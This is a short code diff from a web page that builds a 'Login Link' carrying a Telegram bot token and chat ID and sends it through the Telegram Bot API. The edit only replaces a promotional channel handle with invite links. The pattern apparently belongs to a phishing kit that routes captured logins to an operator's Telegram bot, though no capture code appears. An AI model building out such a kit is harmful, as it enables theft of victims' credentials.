@@ -117,7 +117,7 @@
         var chatId = document.getElementById('chatId').value;
         var loginUrl = window.location.href + "?botToken=" + botToken + "&chatId=" + chatId + "#login";
 
-        var message = `🚀 **Login Link**\n\n🔗 **Link**: ${loginUrl}\n\n👤 **Owner**: @sasumon007\n📢 **Join my channel**: @SA_Tech_Tutorial`;
+        var message = `🚀 **Login Link**\n\n🔗 **Link**: ${loginUrl}\n\n👤 **Owner**: @sasumon007\n📢 **Join my channel**: https://t.me/+XjCxuJspHaQxNTA1?fbclid=IwZXh0bgNhZW0CMTEAAR1Pc2E33PMR89KZj6DsfON-o1ey5j1UBmw_EOZvFPWLvfQsg3wYGs_tZZM_aem_v5p6ja1CWNH0EkGF50tmwQ\nSecond channel : https://t.me/SA_Tech_Tips `;
 
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: "POST",
